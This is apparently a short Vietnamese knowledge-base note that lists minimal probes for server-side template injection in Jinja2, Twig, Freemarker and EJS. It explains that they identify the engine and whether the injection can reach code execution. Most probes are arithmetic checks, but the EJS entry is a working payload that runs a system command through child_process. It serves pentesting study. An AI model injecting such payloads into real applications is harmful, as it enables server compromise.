---
title: Template Injection Minimal Probes
type: entity
related: [[Template Injection]]
---

Các probe tối thiểu được nhắc đến:

- Jinja2: `{{7*7}}`
- Twig: `{{7*7}}`
- Freemarker: `${7*7}`
- EJS: `<%= global.process.mainModule.require('child_process').execSync('id') %>`

Chúng giúp xác định engine và khả năng leo lên execution.